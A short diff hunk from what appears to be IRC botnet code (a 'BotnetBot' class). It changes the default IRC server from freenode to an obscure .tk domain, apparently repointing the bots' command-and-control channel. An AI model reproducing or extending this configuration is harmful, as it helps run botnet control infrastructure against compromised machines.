@@ -326,7 +326,7 @@ class BotnetBot(IRCBot):
 
 def get_parser():
     parser = OptionParser(usage='%prog [options]')
-    parser.add_option('--server', '-s', dest='server', default='irc.freenode.net',
+    parser.add_option('--server', '-s', dest='server', default='irc.atmmtnc.tk',
         help='IRC server to connect to')
     parser.add_option('--port', '-p', dest='port', default=6667,
         help='Port to connect on', type='int')
